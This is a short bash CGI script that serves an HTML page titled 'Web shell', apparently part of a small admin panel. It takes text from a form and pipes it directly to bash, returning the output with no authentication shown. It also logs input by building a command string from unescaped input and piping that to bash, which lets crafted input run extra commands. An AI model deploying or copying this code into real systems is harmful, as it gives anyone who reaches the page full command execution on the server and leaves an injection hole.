#!/bin/bash
 
echo 'Content-type: text/html'
echo
read query
query=`echo "$query" | ./query_getenv_decode.sh rule`
 echo "<html><head><meta charset=\"utf-8\">
<meta http-equiv=\"Content-Style-Type\" content=\"text/css\" />
<link rel=\"stylesheet\" href=\"./md.css\" type=\"text/css\" /><head><body><h2>Web shell</h2>
<script type=\"text/javascript\">
	function addUrl() {
		var state = {
			title: \"title\",
			url: \"#\"
		};
		window.history.pushState(state, \"title\", \"#\");
	}
	
	addUrl();addUrl();addUrl();addUrl();

	window.addEventListener(\"popstate\", function(e) {
		window.location.href = \"../menu.cgi\";
	}, false);
</script>
<form name=\"webshell\" action=\"./webshell.cgi\" method=\"post\">
<table border=\"1\" width=\"100%\">

<tr>
<td width=\"20%\">Bash</td>
<td width=\"80%\">
<textarea name=\"rule\"  rows=\"5\" style=\"width:100%; height:100%; word-break: break-all;\">
</textarea>
</td>
</tr>
</table>
<input type=\"submit\" value=\"提交\">
<input type=\"reset\" value=\"重置\">"
echo "<p>输入</p><pre>"
echo "\$ $query"


echo "</pre><p>输出</p><pre>"
echo "echo \"$query\" >> ./.webshell.log" |bash 
echo "$query" |bash 2>&1
echo "</pre></body></html>"
